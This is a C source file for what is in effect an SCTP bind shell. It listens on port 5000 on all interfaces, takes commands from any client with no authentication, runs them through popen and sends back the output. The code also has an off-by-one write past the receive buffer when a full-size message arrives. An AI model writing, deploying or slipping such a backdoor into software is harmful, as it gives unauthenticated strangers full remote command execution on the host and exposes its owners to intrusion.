#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/sctp.h>

#define PORT 5000
#define BUFSIZE 4096
#define END_MARKER "__END__"

void handle_client(int conn_sock) {
    char buffer[BUFSIZE];

    printf("[*] Connection accepted.\n");

    while (1) {
        memset(buffer, 0, BUFSIZE);
        int n = sctp_recvmsg(conn_sock, buffer, BUFSIZE, NULL, 0, 0, 0);
        if (n <= 0) {
            printf("[*] Client disconnected.\n");
            break;
        }

        buffer[n] = '\0'; // Ensure null-terminated for logging
        //printf("[>] Received command: %s\n", buffer);

        FILE *fp = popen(buffer, "r");
        if (!fp) {
            const char *err = "Failed to run command\n";
            sctp_sendmsg(conn_sock, err, strlen(err), NULL, 0, 0, 0, 0, 0, 0);
        } else {
            char temp[BUFSIZE];
            size_t bytes_read;
            while ((bytes_read = fread(temp, 1, BUFSIZE, fp)) > 0) {
                sctp_sendmsg(conn_sock, temp, bytes_read, NULL, 0, 0, 0, 0, 0, 0);
            }
            pclose(fp);
        }

        // Send end-of-output marker
        sctp_sendmsg(conn_sock, END_MARKER, strlen(END_MARKER), NULL, 0, 0, 0, 0, 0, 0);
    }

    close(conn_sock);
}

int perform_action() {
    int listen_sock;
    struct sockaddr_in servaddr;

    listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (listen_sock < 0) {
        perror("socket");
        exit(1);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    servaddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listen_sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("bind");
        close(listen_sock);
        exit(1);
    }

    if (listen(listen_sock, 5) < 0) {
        perror("listen");
        close(listen_sock);
        exit(1);
    }

    printf("[*] Listening on SCTP port %d...\n", PORT);

    while (1) {
        int conn_sock = accept(listen_sock, NULL, NULL);
        if (conn_sock < 0) {
            perror("accept");
            continue;
        }

        handle_client(conn_sock);
    }

    close(listen_sock);
    return 0;
}
